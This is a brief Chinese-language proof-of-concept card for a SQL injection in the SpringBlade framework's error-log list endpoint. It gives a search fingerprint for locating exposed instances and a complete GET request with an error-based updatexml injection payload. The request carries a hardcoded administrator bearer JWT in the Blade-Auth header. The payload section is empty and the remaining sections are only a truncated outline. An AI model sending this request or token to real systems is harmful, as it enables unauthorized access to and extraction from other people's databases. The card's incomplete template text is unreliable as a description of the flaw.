# SpringBladelist存在SQL注入漏洞

- **系统**：SpringBladelist　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="https://bladex.vip"`
- **请求**：`GET /api/blade-log/error/list?updatexml(1,concat(0x7e,md5(1),0x7e),1)=1 HTTP/1.1`
- **关键头**：`Host: 127.0.0.1`　`Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJ1c2VyX25hbWUiOiJhZG1pbiIsInJlYWxfbmFtZSI6IueuoeeQhuWRmCIsImF1dGhvcml0aWVzIjpbImFkbWluaXN0cmF0b3IiXSwiY2xpZW50X2lkIjoic2FiZXIiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwibGljZW5zZSI6InBvd2VyZWQgYnkgYmxhZGV4IiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwic2NvcGUiOlsiYWxsIl0sIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsIm9hdXRoX2lkIjoiIiwiZGV0YWlsIjp7InR5cGUiOiJ3ZWIifSwiYWNjb3VudCI6ImFkbWluIn0.RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ`

**请求体 / payload**
```

```

**其他**
- SpringBlade list 存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * SpringBlade